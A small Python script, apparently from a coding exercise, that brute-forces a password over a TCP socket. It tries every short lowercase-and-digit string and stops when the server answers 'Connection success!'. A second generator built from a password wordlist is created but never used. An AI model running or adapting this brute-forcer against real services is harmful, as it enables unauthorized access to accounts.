import socket
import sys
import itertools
import string

def simple_brute():
    # Mix of lowercase&digis cartesian products.
    # With bigger number you pass, it will take longer to output all.
    # But will check more of possibilites.
    signs = string.ascii_lowercase + string.digits
    #string.ascii_letters for upper & lowercase
    i = 1
    while i < 7:
        prod_signs = itertools.product(signs, repeat=i)
        for mix in prod_signs:
            yield ''.join(mix)
        i = i + 1

def common_pass_brute():
    with open('passwords.txt', 'r') as cpb:
        for password in cpb:
            # Gets readlines from passwords.txt
            for mix_password in itertools.product(*zip(password.strip().upper(), password.strip().lower())):
                # Mixes upper&lower possibilites of passwords.txt
                yield ''.join(mix_password)

class Cracker:
    def __init__(self):
        # Creating variables for connection via sys.args
        address = (sys.argv[1], int(sys.argv[2]))
        # Taking info about ip / port
        self.socket = socket.socket()
        self.socket.connect(address)
        self.cracking()
        self.socket.close()

    def cracking(self):
        passw_s = simple_brute()
        # Typical brute force
        passw_c = common_pass_brute()
        # Brute force via common pass
        while True:
            try:
                passw = next(passw_s)
                self.socket.send(passw.encode())
                if self.socket.recv(1024).decode() == 'Connection success!':
                    print(passw)
                    exit()
            except StopIteration:
                break


Cracker()
